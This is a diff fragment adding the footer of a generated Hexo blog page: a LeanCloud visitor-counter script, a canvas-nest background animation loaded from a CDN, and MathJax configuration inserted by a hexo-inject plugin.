+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  <script type='text/javascript' color='252,3,184' zIndex='-1' opacity='20' count='99' src='//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js'></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Queue(function() {
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i=0; i < all.length; i += 1) {
+      all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+  });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+<!-- hexo-inject:end -->
+</body>
+</html>
